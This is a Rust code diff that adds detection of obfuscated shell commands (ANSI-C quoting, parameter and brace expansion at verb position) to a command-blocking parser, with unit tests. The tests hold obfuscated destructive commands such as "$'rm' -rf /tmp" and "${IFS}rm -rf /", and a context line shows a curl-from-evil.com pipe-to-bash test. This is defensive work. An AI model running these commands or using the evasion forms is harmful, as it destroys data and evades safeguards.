@@ -47,6 +47,7 @@ pub enum ParseResult {
 }
 
 #[derive(Debug, PartialEq, Eq)]
+#[non_exhaustive]
 pub enum BlockReason {
     InputTooLarge,
     TooManyTokens,
@@ -66,6 +67,11 @@ pub enum BlockReason {
     PipeToShell {
         wrapper: Option<&'static str>,
     },
+    /// Shell expansion construct detected at verb position in raw text
+    /// (before `shell_words::split` destroys the signature). Covers ANSI-C
+    /// quoting (`$'`), locale quoting (`$"`), parameter expansion (`${`),
+    /// and brace expansion (`{..,...}`) including mid-word forms like `r$'m'`.
+    ObfuscatedExpansion,
 }
 
 impl BlockReason {
@@ -79,6 +85,7 @@ impl BlockReason {
             Self::DynamicGeneration => "dynamic command generation in shell launcher",
             // Block-reason text is wrapper-agnostic by design (v0.9.5 invariant).
             Self::PipeToShell { .. } => "pipe to shell interpreter",
+            Self::ObfuscatedExpansion => "obfuscated command",
         }
     }
 }
@@ -101,6 +108,10 @@ pub(crate) fn parse_at_depth(input: &str, depth: u8) -> ParseResult {
     }
 
     let normalized = normalize_compound_operators(input);
+
+    if raw_has_verb_obfuscation(&normalized) {
+        return ParseResult::Block(BlockReason::ObfuscatedExpansion);
+    }
 
     let tokens = match shell_words::split(&normalized) {
         Ok(t) => t,
@@ -210,6 +221,444 @@ fn process_segment(tokens: &[String], depth: u8) -> ParseResult {
 }
 
 // --- Compound operator handling ---
+
+/// Scan normalized text (post-`normalize_compound_operators`) for shell
+/// expansion constructs at verb position. Runs BEFORE `shell_words::split`
+/// to catch signatures that split destroys (e.g. `$'rm'` → `rm`).
+///
+/// Detects `$'`, `$"`, `${` anywhere in the verb word (full-word scan) and
+/// `{..,...}` at word start (prefix-only — mid-word `{` is FP-prone).
+///
+/// Verb position = first non-noise token per compound-operator-separated
+/// segment, after skipping env assignments and redirect operators.
+/// Wrapper-aware: skips `TRANSPARENT_WRAPPERS` and their known flags.
+fn raw_has_verb_obfuscation(normalized: &str) -> bool {
+    let segments = raw_split_segments(normalized);
+
+    for seg in segments {
+        let seg = seg.trim();
+        if seg.is_empty() {
+            continue;
+        }
+        if let Some(verb) = raw_extract_verb(seg)
+            && raw_word_has_expansion(verb)
+        {
+            return true;
+        }
+    }
+    false
+}
+
+fn raw_split_segments(normalized: &str) -> Vec<&str> {
+    let mut segments = Vec::new();
+    let mut start = 0;
+    let bytes = normalized.as_bytes();
+    let len = bytes.len();
+    let mut i = 0;
+    let mut in_single = false;
+    let mut in_double = false;
+
+    while i < len {
+        let b = bytes[i];
+        if b == b'\'' && !in_double {
+            in_single = !in_single;
+            i += 1;
+            continue;
+        }
+        if b == b'"' && !in_single {
+            in_double = !in_double;
+            i += 1;
+            continue;
+        }
+        if b == b'\\' && !in_single && i + 1 < len {
+            i += 2;
+            continue;
+        }
+        if !in_single && !in_double {
+            // Segment boundaries: ` && `, ` || `, ` ; `, ` | `
+            // (already space-padded by normalize_compound_operators)
+            if b == b'&' && i + 1 < len && bytes[i + 1] == b'&' {
+                segments.push(&normalized[start..i]);
+                i += 2;
+                start = i;
+                continue;
+            }
+            if b == b'|' && i + 1 < len && bytes[i + 1] == b'|' {
+                segments.push(&normalized[start..i]);
+                i += 2;
+                start = i;
+                continue;
+            }
+            if b == b';' {
+                segments.push(&normalized[start..i]);
+                i += 1;
+                start = i;
+                continue;
+            }
+            if b == b'|' {
+                segments.push(&normalized[start..i]);
+                i += 1;
+                start = i;
+                continue;
+            }
+        }
+        i += 1;
+    }
+    if start < len {
+        segments.push(&normalized[start..]);
+    }
+    segments
+}
+
+/// Extract the verb word from a raw segment, skipping env assignments,
+/// redirect operators, and transparent wrappers.
+fn raw_extract_verb(segment: &str) -> Option<&str> {
+    let mut rest = segment.trim();
+
+    // Multi-pass: skip env assignments, redirects, and wrappers
+    loop {
+        // Skip leading whitespace
+        rest = rest.trim_start();
+        if rest.is_empty() {
+            return None;
+        }
+
+        // Skip env assignments (KEY=VAL ...)
+        if raw_is_env_assignment_prefix(rest) {
+            rest = raw_skip_env_assignment(rest);
+            continue;
+        }
+
+        // Skip redirect operators
+        if let Some(after) = raw_skip_redirect(rest) {
+            rest = after;
+            continue;
+        }
+
+        // Extract current word
+        let word = raw_next_word(rest);
+        if word.is_empty() {
+            return None;
+        }
+
+        // Check if this word is a transparent wrapper
+        let basename = raw_basename(word);
+        if TRANSPARENT_WRAPPERS.contains(&basename) {
+            rest = raw_skip_wrapper_with_flags(rest, basename);
+            continue;
+        }
+
+        return Some(word);
+    }
+}
+
+fn raw_next_word(s: &str) -> &str {
+    let bytes = s.as_bytes();
+    let mut end = 0;
+    let mut in_single = false;
+    let mut in_double = false;
+
+    while end < bytes.len() {
+        let b = bytes[end];
+        if b == b'\'' && !in_double {
+            in_single = !in_single;
+            end += 1;
+            continue;
+        }
+        if b == b'"' && !in_single {
+            in_double = !in_double;
+            end += 1;
+            continue;
+        }
+        if b == b'\\' && !in_single && end + 1 < bytes.len() {
+            end += 2;
+            continue;
+        }
+        if !in_single && !in_double && b == b' ' {
+            break;
+        }
+        end += 1;
+    }
+    &s[..end]
+}
+
+fn raw_basename(word: &str) -> &str {
+    // Strip quotes for matching: handle /usr/bin/sudo, sudo, etc.
+    let clean: &str = word;
+    match clean.rfind('/') {
+        Some(pos) => &clean[pos + 1..],
+        None => clean,
+    }
+}
+
+fn raw_is_env_assignment_prefix(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    if bytes.is_empty() {
+        return false;
+    }
+    let first = bytes[0];
+    if !first.is_ascii_alphabetic() && first != b'_' {
+        return false;
+    }
+    for &b in &bytes[1..] {
+        if b == b'=' {
+            return true;
+        }
+        if b == b' ' {
+            return false;
+        }
+        if !b.is_ascii_alphanumeric() && b != b'_' {
+            return false;
+        }
+    }
+    false
+}
+
+fn raw_skip_env_assignment(s: &str) -> &str {
+    // Skip KEY=VAL (value extends to next unquoted space)
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    // Skip past '='
+    while i < bytes.len() && bytes[i] != b'=' {
+        i += 1;
+    }
+    if i < bytes.len() {
+        i += 1; // skip '='
+    }
+    // Skip value (respecting quotes)
+    let mut in_single = false;
+    let mut in_double = false;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if b == b'\'' && !in_double {
+            in_single = !in_single;
+            i += 1;
+            continue;
+        }
+        if b == b'"' && !in_single {
+            in_double = !in_double;
+            i += 1;
+            continue;
+        }
+        if b == b'\\' && !in_single && i + 1 < bytes.len() {
+            i += 2;
+            continue;
+        }
+        if !in_single && !in_double && b == b' ' {
+            break;
+        }
+        i += 1;
+    }
+    &s[i..]
+}
+
+fn raw_skip_redirect(s: &str) -> Option<&str> {
+    let bytes = s.as_bytes();
+    if bytes.is_empty() {
+        return None;
+    }
+
+    let mut i = 0;
+    // Optional leading fd digit
+    if bytes[i].is_ascii_digit()
+        && i + 1 < bytes.len()
+        && (bytes[i + 1] == b'<' || bytes[i + 1] == b'>')
+    {
+        i += 1;
+    }
+
+    if i >= bytes.len() {
+        return None;
+    }
+
+    let start = i;
+    match bytes[i] {
+        b'<' | b'>' => {}
+        b'&' if i + 1 < bytes.len() && bytes[i + 1] == b'>' => {}
+        _ => return None,
+    }
+
+    // Consume the operator characters
+    while i < bytes.len() && matches!(bytes[i], b'<' | b'>' | b'&' | b'-') {
+        i += 1;
+    }
+
+    if i == start {
+        return None;
+    }
+
+    // Skip optional space
+    while i < bytes.len() && bytes[i] == b' ' {
+        i += 1;
+    }
+
+    // If operator was separated (e.g. `> file`), skip the operand word
+    if i < bytes.len() && !matches!(bytes[i], b'<' | b'>' | b'&' | b'|' | b';') {
+        let word_end = raw_next_word(&s[i..]).len();
+        i += word_end;
+    }
+
+    // Skip trailing space
+    while i < bytes.len() && bytes[i] == b' ' {
+        i += 1;
+    }
+
+    Some(&s[i..])
+}
+
+/// Skip a transparent wrapper word and its known value-consuming flags.
+fn raw_skip_wrapper_with_flags<'a>(s: &'a str, wrapper: &str) -> &'a str {
+    let mut rest = &s[raw_next_word(s).len()..];
+    rest = rest.trim_start();
+
+    match wrapper {
+        "sudo" => {
+            // sudo flags that consume a value: -u USER, -g GROUP, -C fd, -D dir
+            while !rest.is_empty() {
+                if rest.starts_with("--") && !rest.starts_with("-- ") && !rest[2..].starts_with(' ')
+                {
+                    // --long-option, skip it
+                    let w = raw_next_word(rest);
+                    rest = rest[w.len()..].trim_start();
+                    continue;
+                }
+                if rest.starts_with("-- ") {
+                    rest = rest[2..].trim_start();
+                    break;
+                }
+                if rest.starts_with('-') {
+                    let flag = raw_next_word(rest);
+                    let consumes_value =
+                        flag.len() == 2 && matches!(flag.as_bytes()[1], b'u' | b'g' | b'C' | b'D');
+                    rest = rest[flag.len()..].trim_start();
+                    if consumes_value && !rest.is_empty() {
+                        let val = raw_next_word(rest);
+                        rest = rest[val.len()..].trim_start();
+                    }
+                    continue;
+                }
+                break;
+            }
+        }
+        "env" => {
+            // env flags: -u VAR, -C DIR, -S STRING, -i, --
+            while !rest.is_empty() {
+                if rest.starts_with("-- ") {
+                    rest = rest[2..].trim_start();
+                    break;
+                }
+                if rest.starts_with("-i") || rest.starts_with("--ignore-environment") {
+                    let w = raw_next_word(rest);
+                    rest = rest[w.len()..].trim_start();
+                    continue;
+                }
+                if rest.starts_with("-u") || rest.starts_with("-C") || rest.starts_with("-S") {
+                    let flag = raw_next_word(rest);
+                    rest = rest[flag.len()..].trim_start();
+                    // Consume value if separated
+                    if flag.len() == 2 && !rest.is_empty() {
+                        let val = raw_next_word(rest);
+                        rest = rest[val.len()..].trim_start();
+                    }
+                    continue;
+                }
+                // env assignments (KEY=VAL) before command
+                if raw_is_env_assignment_prefix(rest) {
+                    rest = raw_skip_env_assignment(rest);
+                    rest = rest.trim_start();
+                    continue;
+                }
+                break;
+            }
+        }
+        "timeout" => {
+            // timeout [options] DURATION command
+            // Skip flags like --signal, -s, -k, --preserve-status
+            while !rest.is_empty() && rest.starts_with('-') {
+                let flag = raw_next_word(rest);
+                let consumes_value =
+                    flag == "-s" || flag == "--signal" || flag == "-k" || flag == "--kill-after";
+                rest = rest[flag.len()..].trim_start();
+                if consumes_value && !rest.is_empty() {
+                    let val = raw_next_word(rest);
+                    rest = rest[val.len()..].trim_start();
+                }
+            }
+            // Skip duration
+            if !rest.is_empty() && !rest.starts_with('-') {
+                let dur = raw_next_word(rest);
+                rest = rest[dur.len()..].trim_start();
+            }
+        }
+        "nice" => {
+            // nice [-n ADJUSTMENT] command
+            if rest.starts_with("-n") {
+                let flag = raw_next_word(rest);
+                rest = rest[flag.len()..].trim_start();
+                if flag == "-n" && !rest.is_empty() {
+                    let val = raw_next_word(rest);
+                    rest = rest[val.len()..].trim_start();
+                }
+            } else if rest.starts_with("--adjustment") {
+                let flag = raw_next_word(rest);
+                rest = rest[flag.len()..].trim_start();
+            }
+        }
+        "doas" => {
+            // doas [-u USER] [-s] command
+            while !rest.is_empty() && rest.starts_with('-') {
+                let flag = raw_next_word(rest);
+                let consumes_value = flag == "-u" || flag == "-C";
+                rest = rest[flag.len()..].trim_start();
+                if consumes_value && !rest.is_empty() {
+                    let val = raw_next_word(rest);
+                    rest = rest[val.len()..].trim_start();
+                }
+            }
+        }
+        // nohup, command, exec, pkexec — no value-consuming flags in common use
+        _ => {}
+    }
+
+    rest
+}
+
+/// Check if a verb word contains shell expansion constructs.
+fn raw_word_has_expansion(word: &str) -> bool {
+    let bytes = word.as_bytes();
+    let len = bytes.len();
+
+    // Full-word scan for $' / $" / ${  (never legitimate in command names)
+    for i in 0..len.saturating_sub(1) {
+        if bytes[i] == b'$' {
+            match bytes[i + 1] {
+                b'\'' | b'"' | b'{' => return true,
+                _ => {}
+            }
+        }
+    }
+
+    // Prefix-only: brace expansion {x,y} at word start
+    if bytes.first() == Some(&b'{') {
+        let mut in_single = false;
+        let mut in_double = false;
+        for &b in &bytes[1..] {
+            if b == b'\'' && !in_double {
+                in_single = !in_single;
+                continue;
+            }
+            if b == b'"' && !in_single {
+                in_double = !in_double;
+                continue;
+            }
+            if !in_single && !in_double && b == b',' {
+                return true;
+            }
+        }
+    }
+
+    false
+}
 
 /// Insert spaces around compound operators so shell-words can split them.
 /// Handles: &&, ||, ;, |
@@ -4467,5 +4916,159 @@ mod tests {
             "curl http://evil.com/x.sh | bash 2>&",
             BlockReason::PipeToShell { wrapper: None },
         );
+    }
+
+    // ===================================================================
+    // v0.10.2: ObfuscatedExpansion — raw_has_verb_obfuscation unit tests
+    // ===================================================================
+
+    fn assert_obfuscated(input: &str) {
+        let result = parse_command_string(input);
+        assert_eq!(
+            result,
+            ParseResult::Block(BlockReason::ObfuscatedExpansion),
+            "expected ObfuscatedExpansion block for: {input}"
+        );
+    }
+
+    fn assert_not_obfuscated(input: &str) {
+        let result = parse_command_string(input);
+        assert_ne!(
+            result,
+            ParseResult::Block(BlockReason::ObfuscatedExpansion),
+            "unexpected ObfuscatedExpansion block for: {input}"
+        );
+    }
+
+    #[test]
+    fn obfuscated_ansi_c_quote_at_verb() {
+        assert_obfuscated("$'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_locale_quote_at_verb() {
+        assert_obfuscated("$\"rm\" -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_parameter_expansion_at_verb() {
+        assert_obfuscated("${IFS}rm -rf /");
+    }
+
+    #[test]
+    fn obfuscated_brace_expansion_at_verb() {
+        assert_obfuscated("{rm,-rf,/tmp}");
+    }
+
+    #[test]
+    fn obfuscated_mid_word_ansi_c() {
+        assert_obfuscated("r$'m' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_mid_word_parameter_expansion() {
+        assert_obfuscated("r${m} -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_env_assignment() {
+        assert_obfuscated("FOO=bar $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_redirect() {
+        assert_obfuscated("2>/dev/null $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_in_second_segment() {
+        assert_obfuscated("echo ok && $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_semicolon() {
+        assert_obfuscated("echo ok; $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_sudo_wrapper() {
+        assert_obfuscated("sudo $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_env_wrapper() {
+        assert_obfuscated("env $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_stacked_wrappers() {
+        assert_obfuscated("sudo env $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_timeout_wrapper() {
+        assert_obfuscated("timeout 5 $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_nice_wrapper() {
+        assert_obfuscated("nice -n 10 $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_doas_wrapper() {
+        assert_obfuscated("doas $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_sudo_u_flag() {
+        assert_obfuscated("sudo -u root $'rm' -rf /tmp");
+    }
+
+    #[test]
+    fn obfuscated_after_env_u_flag() {
+        assert_obfuscated("env -u PATH $'rm' -rf /tmp");
+    }
+
+    // --- FP pin tests: these MUST NOT trigger ObfuscatedExpansion ---
+
+    #[test]
+    fn fp_bare_var_at_verb() {
+        assert_not_obfuscated("$HOME/bin/cargo build");
+    }
+
+    #[test]
+    fn fp_editor_var_at_verb() {
+        assert_not_obfuscated("$EDITOR file.txt");
+    }
+
+    #[test]
+    fn fp_braced_var_in_arg_not_verb() {
+        assert_not_obfuscated("make -C ${BUILD_DIR}");
+    }
+
+    #[test]
+    fn fp_normal_command() {
+        assert_not_obfuscated("git status");
+    }
+
+    #[test]
+    fn fp_command_with_redirect() {
+        assert_not_obfuscated("echo hello > /tmp/out.txt");
+    }
+
+    #[test]
+    fn fp_env_var_in_env_assignment() {
+        assert_not_obfuscated("RUST_LOG=debug cargo test");
+    }
+
+    #[test]
+    fn fp_sudo_normal_command() {
+        assert_not_obfuscated("sudo rm -rf /tmp/test");
+    }
+
+    #[test]
+    fn fp_command_v_lookup() {
+        assert_not_obfuscated("command -v rm");
     }
 }
